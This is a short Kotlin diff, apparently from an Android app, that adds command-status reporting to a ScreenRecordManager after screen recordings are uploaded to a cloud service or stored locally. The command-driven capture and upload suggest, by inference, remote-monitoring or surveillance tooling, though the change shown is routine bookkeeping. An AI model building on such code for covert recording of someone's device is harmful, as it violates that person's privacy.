@@ -14,6 +14,7 @@ import java.io.File
 
 object ScreenRecordManager {
     var expectedMode: String = ""
+    var pendingCmdId: Int = -1
     var pendingDur: Int = 60
     var pendingQual: String = "MED"
     var pendingAudio: Boolean = false
@@ -158,9 +159,11 @@ object ScreenRecordManager {
             // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
             runBlocking { 
                 if (CloudManager.uploadFile(ctx, finalFile, "SCREEN_RECORD")) {
+                    CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "UPLOAD_SUCCESS", null, null, "SCREEN_RECORD/${finalFile.name}")
                     finalFile.delete()
                 } else {
                     DumpManager.vaultMedia(finalFile, "SCREEN_RECORD")
+                    CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "QUEUED_OFFLINE", "Media vaulted locally pending network.")
                 }
             }
         } else if (tempFile.exists()) {
